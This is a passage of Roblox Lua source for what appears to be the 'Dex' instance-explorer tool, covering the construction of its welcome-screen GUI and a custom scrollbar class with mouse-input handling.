	local DexGui74 = CreateInstance("ImageLabel",{Image="rbxassetid://503289231",ImageColor3=Color3.new(1,1,1),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=1,SliceCenter=Rect.new(20,20,460,260),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,-20,0,-20),Rotation=0,Selectable=false,Size=UDim2.new(0,540,0,340),SizeConstraint=0,Visible=true,ZIndex=1,Name="Outline",Parent = DexGui73})
	local DexGui75 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=true,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,0,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Content",Parent = DexGui73})
	local DexGui76 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.18823531270027,0.18823531270027,0.18823531270027),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0.60000002384186,0,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Main",Parent = DexGui75})
	local DexGui77 = CreateInstance("TextLabel",{Font=4,FontSize=9,Text="DEX",TextColor3=Color3.new(1,1,1),TextScaled=false,TextSize=48,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,0,0,100),SizeConstraint=0,Visible=true,ZIndex=1,Name="Title",Parent = DexGui76})
	local DexGui78 = CreateInstance("TextLabel",{Font=4,FontSize=6,Text="V1.1.0 ALPHA",TextColor3=Color3.new(1,1,1),TextScaled=false,TextSize=18,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=1,TextYAlignment=2,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1,-105,1,-20),Rotation=0,Selectable=false,Size=UDim2.new(0,100,0,20),SizeConstraint=0,Visible=true,ZIndex=1,Name="Version",Parent = DexGui76})
	local DexGui79 = CreateInstance("TextLabel",{Font=4,FontSize=6,Text="Made by Moon & Courtney",TextColor3=Color3.new(1,1,1),TextScaled=false,TextSize=18,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=2,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,5,1,-20),Rotation=0,Selectable=false,Size=UDim2.new(0,100,0,20),SizeConstraint=0,Visible=true,ZIndex=1,Name="Creator",Parent = DexGui76})
	local DexGui80 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.039215687662363,0.039215687662363,0.039215687662363),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,50,0,120),Rotation=0,Selectable=false,Size=UDim2.new(0,200,0,80),SizeConstraint=0,Visible=true,ZIndex=1,Name="Progress",Parent = DexGui76})
	local DexGui81 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,2,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Line",Parent = DexGui80})
	local DexGui82 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="Fetching latest API...",TextColor3=Color3.new(0.78431379795074,0.78431379795074,0.78431379795074),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,10,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,-10,0,15),SizeConstraint=0,Visible=true,ZIndex=1,Name="Progress1",Parent = DexGui80})
	local DexGui83 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="Fetching latest Reflection Metadata...",TextColor3=Color3.new(0.78431379795074,0.78431379795074,0.78431379795074),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,10,0,15),Rotation=0,Selectable=false,Size=UDim2.new(1,-10,0,15),SizeConstraint=0,Visible=true,ZIndex=1,Name="Progress2",Parent = DexGui80})
	local DexGui84 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="Importing DexStorage items...",TextColor3=Color3.new(0.78431379795074,0.78431379795074,0.78431379795074),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,10,0,30),Rotation=0,Selectable=false,Size=UDim2.new(1,-10,0,15),SizeConstraint=0,Visible=true,ZIndex=1,Name="Progress3",Parent = DexGui80})
	local DexGui85 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="Indexing tree list...",TextColor3=Color3.new(0.78431379795074,0.78431379795074,0.78431379795074),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,10,0,45),Rotation=0,Selectable=false,Size=UDim2.new(1,-10,0,15),SizeConstraint=0,Visible=true,ZIndex=1,Name="Progress4",Parent = DexGui80})
	local DexGui86 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="Starting up...",TextColor3=Color3.new(0.78431379795074,0.78431379795074,0.78431379795074),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,10,0,60),Rotation=0,Selectable=false,Size=UDim2.new(1,-10,0,15),SizeConstraint=0,Visible=true,ZIndex=1,Name="Progress5",Parent = DexGui80})
	local DexGui87 = CreateInstance("TextButton",{Font=4,FontSize=6,Text="X",TextColor3=Color3.new(1,1,1),TextScaled=false,TextSize=18,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,AutoButtonColor=true,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=true,Size=UDim2.new(0,20,0,20),SizeConstraint=0,Visible=true,ZIndex=1,Name="Closer",Parent = DexGui76})
	local DexGui88 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.60000002384186,0,1,-50),Rotation=0,Selectable=false,Size=UDim2.new(0.40000000596046,0,0,50),SizeConstraint=0,Visible=true,ZIndex=1,Name="Bottom",Parent = DexGui75})
	local DexGui89 = CreateInstance("ImageLabel",{Image="rbxassetid://493608750",ImageColor3=Color3.new(1,1,1),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,5,0,5),Rotation=0,Selectable=false,Size=UDim2.new(0,40,0,40),SizeConstraint=0,Visible=true,ZIndex=1,Name="Logo",Parent = DexGui88})
	local DexGui90 = CreateInstance("TextLabel",{Font=3,FontSize=6,Text="Powerful and light",TextColor3=Color3.new(1,1,1),TextScaled=false,TextSize=18,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=true,TextXAlignment=0,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,50,0,5),Rotation=0,Selectable=false,Size=UDim2.new(1,-55,0,25),SizeConstraint=0,Visible=true,ZIndex=1,Name="Desc",Parent = DexGui88})
	local DexGui91 = CreateInstance("TextLabel",{Font=4,FontSize=4,Text="Image by KrystalTeam",TextColor3=Color3.new(1,1,1),TextScaled=false,TextSize=12,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=2,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,50,1,-20),Rotation=0,Selectable=false,Size=UDim2.new(1,-55,0,15),SizeConstraint=0,Visible=true,ZIndex=1,Name="Credit",Parent = DexGui88})
	local DexGui92 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=0,BorderColor3=Color3.new(0.43921571969986,0.43921571969986,0.43921571969986),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0.60000002384186,5,0,20),Rotation=0,Selectable=false,Size=UDim2.new(0.40000000596046,-10,1,-75),SizeConstraint=0,Visible=true,ZIndex=1,Name="Changelog",Parent = DexGui75})
	local DexGui93 = CreateInstance("TextLabel",{Font=10,FontSize=5,Text="Changelog",TextColor3=Color3.new(1,1,1),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,-20),Rotation=0,Selectable=false,Size=UDim2.new(1,0,0,20),SizeConstraint=0,Visible=true,ZIndex=1,Name="Title",Parent = DexGui92})
	return DexGui
end

-- Main Gui References
local gui = createDexGui()
gui.Parent = Services.Players.LocalPlayer.PlayerGui
local contentL = gui:WaitForChild("ContentFrameL")
local contentR = gui:WaitForChild("ContentFrameR")
local resources = gui:WaitForChild("Resources")

-- Welcome Gui References
local welcomeFrame = gui:WaitForChild("WelcomeFrame")
local welcomeOutline = welcomeFrame:WaitForChild("Outline")
local welcomeContents = welcomeFrame:WaitForChild("Content")
local welcomeMain = welcomeContents:WaitForChild("Main")
local welcomeChangelog = welcomeContents:WaitForChild("Changelog")
local welcomeBottom = welcomeContents:WaitForChild("Bottom")
local welcomeProgress = welcomeMain:WaitForChild("Progress")

-- Explorer Stuff
local explorerTree = nil
local updateDebounce = false
local rightClickContext = nil
local rightEntry = nil
local clipboard = {}
local lastSearch = 0
local nodeWidth = 0

-- Properties Stuff
local propertiesTree = nil
local propWidth = 0

-- Settings
local explorerSettings = {
	LPaneWidth = 300,
	RPaneWidth = 300
}

-- JSON Stuff
local API
local RMD

-- Main Variables
local mouse = Services.Players.LocalPlayer:GetMouse()
local mouseWindow = nil
local LPaneItems = {}
local RPaneItems = {}
local setPane = "None"
local activeWindows = {}
local f = {}
local API = {}
local RMD = {}

-- ScrollBar
function f.buttonArrows(size,num,dir)
	local max = num
	local arrowFrame = CreateInstance("Frame",{
		BackgroundTransparency = 1,
		Name = "Arrow",
		Size = UDim2.new(0,size,0,size)
	})
	if dir == "up" then
		for i = 1,num do
			local newLine = CreateInstance("Frame",{
				BackgroundColor3 = Color3.new(220/255,220/255,220/255),
				BorderSizePixel = 0,
				Position = UDim2.new(0,math.floor(size/2)-(i-1),0,math.floor(size/2)+i-math.floor(max/2)-1),
				Size = UDim2.new(0,i+(i-1),0,1),
				Parent = arrowFrame
			})
		end
		return arrowFrame
	elseif dir == "down" then
		for i = 1,num do
			local newLine = CreateInstance("Frame",{
				BackgroundColor3 = Color3.new(220/255,220/255,220/255),
				BorderSizePixel = 0,
				Position = UDim2.new(0,math.floor(size/2)-(i-1),0,math.floor(size/2)-i+math.floor(max/2)+1),
				Size = UDim2.new(0,i+(i-1),0,1),
				Parent = arrowFrame
			})
		end
		return arrowFrame
	elseif dir == "left" then
		for i = 1,num do
			local newLine = CreateInstance("Frame",{
				BackgroundColor3 = Color3.new(220/255,220/255,220/255),
				BorderSizePixel = 0,
				Position = UDim2.new(0,math.floor(size/2)+i-math.floor(max/2)-1,0,math.floor(size/2)-(i-1)),
				Size = UDim2.new(0,1,0,i+(i-1)),
				Parent = arrowFrame
			})
		end
		return arrowFrame
	elseif dir == "right" then
		for i = 1,num do
			local newLine = CreateInstance("Frame",{
				BackgroundColor3 = Color3.new(220/255,220/255,220/255),
				BorderSizePixel = 0,
				Position = UDim2.new(0,math.floor(size/2)-i+math.floor(max/2)+1,0,math.floor(size/2)-(i-1)),
				Size = UDim2.new(0,1,0,i+(i-1)),
				Parent = arrowFrame
			})
		end
		return arrowFrame
	end
	error("r u ok")
end

local ScrollBar do
	ScrollBar = {}
	
	local user = game:GetService("UserInputService")
	local mouse = game:GetService("Players").LocalPlayer:GetMouse()
	
	ScrollMt = {
		__index = {
			AddMarker = function(self,ind,color)
				self.Markers[ind] = color or Color3.new(0,0,0)
			end,
			ScrollTo = function(self,ind)
				self.Index = ind
				self:Update()
			end,
			ScrollUp = function(self)
				self.Index = self.Index - self.Increment
				self:Update()
			end,
			ScrollDown = function(self)
				self.Index = self.Index + self.Increment
				self:Update()
			end,
			CanScrollUp = function(self)
				return self.Index > 0
			end,
			CanScrollDown = function(self)
				return self.Index + self.VisibleSpace < self.TotalSpace
			end,
			GetScrollPercent = function(self)
				return self.Index/(self.TotalSpace-self.VisibleSpace)
			end,
			SetScrollPercent = function(self,perc)
				self.Index = math.floor(perc*(self.TotalSpace-self.VisibleSpace))
				self:Update()
			end
		}
	}
	
	function ScrollBar.new(hor)
		local newFrame = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.35294118523598,0.35294118523598,0.35294118523598),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1,-16,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,16,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="ScrollBar",})
		local button1 = nil
		local button2 = nil
		
		local lastTotalSpace = 0
		
		if hor then
			newFrame.Size = UDim2.new(1,0,0,16)
			button1 = CreateInstance("ImageButton",{
				Parent = newFrame,
				Name = "Left",
				Size = UDim2.new(0,16,0,16),
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				AutoButtonColor = false
			})
			f.buttonArrows(16,4,"left").Parent = button1
			button2 = CreateInstance("ImageButton",{
				Parent = newFrame,
				Name = "Right",
				Position = UDim2.new(1,-16,0,0),
				Size = UDim2.new(0,16,0,16),
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				AutoButtonColor = false
			})
			f.buttonArrows(16,4,"right").Parent = button2
		else
			newFrame.Size = UDim2.new(0,16,1,0)
			button1 = CreateInstance("ImageButton",{
				Parent = newFrame,
				Name = "Up",
				Size = UDim2.new(0,16,0,16),
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				AutoButtonColor = false
			})
			f.buttonArrows(16,4,"up").Parent = button1
			button2 = CreateInstance("ImageButton",{
				Parent = newFrame,
				Name = "Down",
				Position = UDim2.new(0,0,1,-16),
				Size = UDim2.new(0,16,0,16),
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				AutoButtonColor = false
			})
			f.buttonArrows(16,4,"down").Parent = button2
		end
		
		local scrollThumbFrame = CreateInstance("Frame",{
			BackgroundTransparency = 1,
			Parent = newFrame
		})
		if hor then
			scrollThumbFrame.Position = UDim2.new(0,16,0,0)
			scrollThumbFrame.Size = UDim2.new(1,-32,1,0)
		else
			scrollThumbFrame.Position = UDim2.new(0,0,0,16)
			scrollThumbFrame.Size = UDim2.new(1,0,1,-32)
		end
		
		local scrollThumb = CreateInstance("Frame",{
			BackgroundColor3 = Color3.new(120/255,120/255,120/255),
			BorderSizePixel = 0,
			Parent = scrollThumbFrame
		})
		
		local markerFrame = CreateInstance("Frame",{
			BackgroundTransparency = 1,
			Name = "Markers",
			Size = UDim2.new(1,0,1,0),
			Parent = scrollThumbFrame
		})
		
		local newMt = setmetatable({
			Gui = newFrame,
			Index = 0,
			VisibleSpace = 0,
			TotalSpace = 0,
			Increment = 1,
			Markers = {}
		},ScrollMt)
		
		local function drawThumb()
			local total = newMt.TotalSpace
			local visible = newMt.VisibleSpace
			local index = newMt.Index
			
			if not (newMt:CanScrollUp()	or newMt:CanScrollDown()) then
				scrollThumb.Visible = false
			else
				scrollThumb.Visible = true
			end
			
			if hor then
				scrollThumb.Size = UDim2.new(visible/total,0,1,0)
				if scrollThumb.AbsoluteSize.X < 16 then
					scrollThumb.Size = UDim2.new(0,16,1,0)
				end
				local fs = scrollThumbFrame.AbsoluteSize.X
				local bs = scrollThumb.AbsoluteSize.X
				scrollThumb.Position = UDim2.new(newMt:GetScrollPercent()*(fs-bs)/fs,0,0,0)
			else
				scrollThumb.Size = UDim2.new(1,0,visible/total,0)
				if scrollThumb.AbsoluteSize.Y < 16 then
					scrollThumb.Size = UDim2.new(1,0,0,16)
				end
				local fs = scrollThumbFrame.AbsoluteSize.Y
				local bs = scrollThumb.AbsoluteSize.Y
				scrollThumb.Position = UDim2.new(0,0,newMt:GetScrollPercent()*(fs-bs)/fs,0)
			end
		end
		
		local function updateMarkers()
			markerFrame:ClearAllChildren()
	
			for i,v in pairs(newMt.Markers) do
				if i < newMt.TotalSpace then
					CreateInstance("Frame",{
						BackgroundTransparency = 0,
						BackgroundColor3 = v,
						BorderSizePixel = 0,
						Position = hor and UDim2.new(i/newMt.TotalSpace,0,1,-6) or UDim2.new(1,-6,i/newMt.TotalSpace,0),
						Size = hor and UDim2.new(0,1,0,6) or UDim2.new(0,6,0,1),
						Name = "Marker"..tostring(i),
						Parent = markerFrame
					})
				end
			end
		end
		newMt.UpdateMarkers = updateMarkers
		
		local function update()
			local total = newMt.TotalSpace
			local visible = newMt.VisibleSpace
			local index = newMt.Index
			
			if visible <= total then
				if index > 0 then
					if index + visible > total then
						newMt.Index = total - visible
					end
				else
					newMt.Index = 0
				end
			else
				newMt.Index = 0
			end

			if lastTotalSpace ~= newMt.TotalSpace then
				lastTotalSpace = newMt.TotalSpace
				updateMarkers()
			end
			
			if newMt.OnUpdate then newMt:OnUpdate() end
			
			if newMt:CanScrollUp() then
				for i,v in pairs(button1.Arrow:GetChildren()) do
					v.BackgroundTransparency = 0
				end
			else
				button1.BackgroundTransparency = 1
				for i,v in pairs(button1.Arrow:GetChildren()) do
					v.BackgroundTransparency = 0.5
				end
			end
			if newMt:CanScrollDown() then
				for i,v in pairs(button2.Arrow:GetChildren()) do
					v.BackgroundTransparency = 0
				end
			else
				button2.BackgroundTransparency = 1
				for i,v in pairs(button2.Arrow:GetChildren()) do
					v.BackgroundTransparency = 0.5
				end
			end
			
			drawThumb()
		end
		
		local buttonPress = false
		local thumbPress = false
		local thumbFramePress = false
		
		local thumbColor = Color3.new(120/255,120/255,120/255)
		local thumbSelectColor = Color3.new(140/255,140/255,140/255)
		button1.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement and not buttonPress and newMt:CanScrollUp() then button1.BackgroundTransparency = 0.8 end
			if input.UserInputType ~= Enum.UserInputType.MouseButton1 or not newMt:CanScrollUp() then return end
			buttonPress = true
			button1.BackgroundTransparency = 0.5
			if newMt:CanScrollUp() then newMt:ScrollUp() end
			local buttonTick = tick()
			local releaseEvent
			releaseEvent = user.InputEnded:Connect(function(input)
				if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
				releaseEvent:Disconnect()
				if f.checkMouseInGui(button1) and newMt:CanScrollUp() then button1.BackgroundTransparency = 0.8 else button1.BackgroundTransparency = 1 end
				buttonPress = false
			end)
			while buttonPress do
				if tick() - buttonTick >= 0.3 and newMt:CanScrollUp() then
					newMt:ScrollUp()
				end
				wait()
			end
		end)
		button1.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement and not buttonPress then button1.BackgroundTransparency = 1 end
		end)
		button2.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement and not buttonPress and newMt:CanScrollDown() then button2.BackgroundTransparency = 0.8 end
			if input.UserInputType ~= Enum.UserInputType.MouseButton1 or not newMt:CanScrollDown() then return end
			buttonPress = true
			button2.BackgroundTransparency = 0.5
			if newMt:CanScrollDown() then newMt:ScrollDown() end
			local buttonTick = tick()
			local releaseEvent
			releaseEvent = user.InputEnded:Connect(function(input)
				if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
				releaseEvent:Disconnect()
				if f.checkMouseInGui(button2) and newMt:CanScrollDown() then button2.BackgroundTransparency = 0.8 else button2.BackgroundTransparency = 1 end
				buttonPress = false
			end)
			while buttonPress do
				if tick() - buttonTick >= 0.3 and newMt:CanScrollDown() then
					newMt:ScrollDown()
				end
				wait()
			end
		end)
		button2.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement and not buttonPress then button2.BackgroundTransparency = 1 end
		end)
		
		scrollThumb.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement and not thumbPress then scrollThumb.BackgroundTransparency = 0.2 scrollThumb.BackgroundColor3 = thumbSelectColor end
			if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
			
			local dir = hor and "X" or "Y"
			local lastThumbPos = nil
			
			buttonPress = false
			thumbFramePress = false			
			thumbPress = true
			scrollThumb.BackgroundTransparency = 0
			local mouseOffset = mouse[dir] - scrollThumb.AbsolutePosition[dir]
			local mouseStart = mouse[dir]
			local releaseEvent
			local mouseEvent
			releaseEvent = user.InputEnded:Connect(function(input)
				if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
				releaseEvent:Disconnect()
				if mouseEvent then mouseEvent:Disconnect() end
				if f.checkMouseInGui(scrollThumb) then scrollThumb.BackgroundTransparency = 0.2 else scrollThumb.BackgroundTransparency = 0 scrollThumb.BackgroundColor3 = thumbColor end
				thumbPress = false
			end)
			newMt:Update()
			--while math.abs(mouse[dir] - mouseStart) == 0 do wait() end
			mouseEvent = user.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement and thumbPress and releaseEvent.Connected then
					local thumbFrameSize = scrollThumbFrame.AbsoluteSize[dir]-scrollThumb.AbsoluteSize[dir]
					local pos = mouse[dir] - scrollThumbFrame.AbsolutePosition[dir] - mouseOffset
					if pos > thumbFrameSize then
						pos = thumbFrameSize
					elseif pos < 0 then
						pos = 0
					end
					if lastThumbPos ~= pos then
						lastThumbPos = pos
						newMt:ScrollTo(math.floor(pos/thumbFrameSize*(newMt.TotalSpace-newMt.VisibleSpace)))
					end
					wait()
				end
			end)
		end)
		scrollThumb.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement and not thumbPress then scrollThumb.BackgroundTransparency = 0 scrollThumb.BackgroundColor3 = thumbColor end
		end)
		scrollThumbFrame.InputBegan:Connect(function(input)
			if input.UserInputType ~= Enum.UserInputType.MouseButton1 or f.checkMouseInGui(scrollThumb) then return end
			
			local dir = hor and "X" or "Y"
			
			local function doTick()
				local thumbFrameSize = scrollThumbFrame.AbsoluteSize[dir]-scrollThumb.AbsoluteSize[dir]
				local thumbFrameDist = scrollThumb.AbsolutePosition[dir] - scrollThumbFrame.AbsolutePosition[dir]
				local pos = thumbFrameDist + (mouse[dir] < scrollThumb.AbsolutePosition[dir] + math.floor(scrollThumb.AbsoluteSize[dir]/2) and -50 or 50)
				if pos > thumbFrameSize then
					pos = thumbFrameSize
				elseif pos < 0 then
					pos = 0
				end
				if pos < thumbFrameDist and scrollThumbFrame.AbsolutePosition[dir] + pos + math.floor(scrollThumb.AbsoluteSize[dir]/2) <= mouse[dir] then
					pos = mouse[dir] - scrollThumbFrame.AbsolutePosition[dir] - math.floor(scrollThumb.AbsoluteSize[dir]/2)
				elseif pos > thumbFrameDist and scrollThumbFrame.AbsolutePosition[dir] + pos + math.floor(scrollThumb.AbsoluteSize[dir]/2) >= mouse[dir] then
					pos = mouse[dir] - scrollThumbFrame.AbsolutePosition[dir] - math.floor(scrollThumb.AbsoluteSize[dir]/2)
				end
				newMt:ScrollTo(math.floor(pos/thumbFrameSize*(newMt.TotalSpace-newMt.VisibleSpace)))
			end
			
			thumbPress = false			
			thumbFramePress = true
			doTick()
			local thumbFrameTick = tick()
			local releaseEvent
			releaseEvent = user.InputEnded:Connect(function(input)
				if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
				releaseEvent:Disconnect()
				thumbFramePress = false
			end)
			while thumbFramePress and not f.checkMouseInGui(scrollThumb) do
				if tick() - thumbFrameTick >= 0.3 then
					doTick()
				end
				wait()
			end
		end)
		
		local function texture(self,data)
			thumbColor = data.ThumbColor or Color3.new(0,0,0)
			thumbSelectColor = data.ThumbSelectColor or Color3.new(0,0,0)
			scrollThumb.BackgroundColor3 = data.ThumbColor or Color3.new(0,0,0)
			newFrame.BackgroundColor3 = data.FrameColor or Color3.new(0,0,0)
			button1.BackgroundColor3 = data.ButtonColor or Color3.new(0,0,0)
			button2.BackgroundColor3 = data.ButtonColor or Color3.new(0,0,0)
			for i,v in pairs(button1.Arrow:GetChildren()) do
				v.BackgroundColor3 = data.ArrowColor or Color3.new(0,0,0)
			end
			for i,v in pairs(button2.Arrow:GetChildren()) do
				v.BackgroundColor3 = data.ArrowColor or Color3.new(0,0,0)
			end
		end
		newMt.Texture = texture
		
		local wheelIncrement = 1
		local scrollOverlay = Instance.new("ScrollingFrame")
		scrollOverlay.BackgroundTransparency = 1
		scrollOverlay.Size = UDim2.new(1,0,1,0)
		scrollOverlay.ScrollBarThickness = 0
		scrollOverlay.CanvasSize = UDim2.new(0,0,0,0)
		local scrollOverlayFrame = Instance.new("Frame",scrollOverlay)
		scrollOverlayFrame.BackgroundTransparency = 1
		scrollOverlayFrame.Size = UDim2.new(1,0,1,0)
